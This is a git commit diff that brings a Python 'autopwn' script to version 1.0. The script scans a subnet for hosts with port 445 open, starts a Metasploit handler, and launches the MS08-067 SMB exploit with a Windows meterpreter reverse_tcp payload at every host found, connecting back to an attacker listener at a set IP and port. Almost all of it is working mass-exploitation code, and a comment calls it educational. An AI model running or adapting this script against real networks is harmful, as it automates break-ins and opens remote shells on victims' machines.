d031c5d3d36aeb7766ba39bd6e7ec7d6913d30e9
gaudard <gaudard@gmail.com>
2014-09-03 10:10:51 -0400

    updated to version 1.0

--- Python/msfcli.py
+++ Python/msfcli.py
@@ -2,51 +2,66 @@
 
 ### Created by @jgaudard
 ### For educational use only
-### Version 0.9
+### Version 1.0
 
 
 
 import socket as sk
 import subprocess, shlex
  
-### Variables
+### Default Variables
 targets = []
 payload = 'windows/meterpreter/reverse_tcp'
+exploit="windows/smb/ms08_067_netapi"
+targetfile="hosts.txt"
+lhost="172.16.175.100"
+lport="443"
+net="172.16.175"
+netStart=1
+netStop=254
  
  
 ### Scans target network for open port 445
-def scanner(ipsub, ipnet1, ipnet2, portrange):
+def scanner(net, netStart, netStop):
 	print('running scanner')
-        for octect in range(ipnet1,ipnet2):
-                test = ipsub + '.' + str(octect)
-                for port in range(portrange, portrange + 1):
-                        try:
+        for octect in range(netStart,netStop):
+                test = net + '.' + str(octect)
+                try:
                                
-                                network = ipsub + '.' + str(octect)
-                               
-                                s=sk.socket(sk.AF_INET, sk.SOCK_STREAM)
-                                s.settimeout(1)
-                                s.connect((network, port))
-                                targets.append(network)
-                                s.close
-                        except: continue
+			network = net + '.' + str(octect)
+			s=sk.socket(sk.AF_INET, sk.SOCK_STREAM)
+			s.settimeout(1)
+			s.connect((network, 445))
+			targets.append(network)
+			s.close
+		except: continue
  
-### Starts MSF Handler
+### Starts MSF Handler in a new terminal window
 def msfhandler():
         print('Starting Handler')
-        handler = subprocess.Popen(shlex.split('gnome-terminal -x msfcli exploit/multi/handler payload=windows/meterpreter/reverse_tcp lhost=172.16.175.100 lport=1337 E'))
+        handler = subprocess.Popen(shlex.split('gnome-terminal -x msfcli exploit/multi/handler PAYLOAD={0} LHOST={1} LPORT={2} E'.format(payload, lhost, lport)))
        
  
 ### the autopwn
 def autopwn(targets):
-	print('starting to autopwn targets')
+	print('starting to autopwn targets: {0}'.format(targets))
 	for target in targets:
-		subprocess.Popen(shlex.split('msfcli windows/smb/ms08_067_netapi payload=windows/meterpreter/reverse_tcp rhost=%s lhost=172.16.175.100 lport=1337 DisablePayloadHandler=true E' % target))
+		subprocess.Popen(shlex.split('msfcli {0} PAYLOAD={1} RHOST={2} LHOST={3} LPORT={4} DisablePayloadHandler=true E'.format(exploit, payload, target, lhost, lport)))
+	del targets[:]
 	
 
 
 msfhandler()
-scanner('172.16.175', 9, 11, 445)
+scanner(net, netStart, netStop)
 autopwn(targets)
+
+### Examples ###
+### Use multiple scanner and autopwn modules to scan and pwn more!
+'''
+scanner(net, 16, 24)
+autopwn(targets)
+scanner('172.16.175', netStart, netStop)
+autopwn(targets)
+'''
 
 
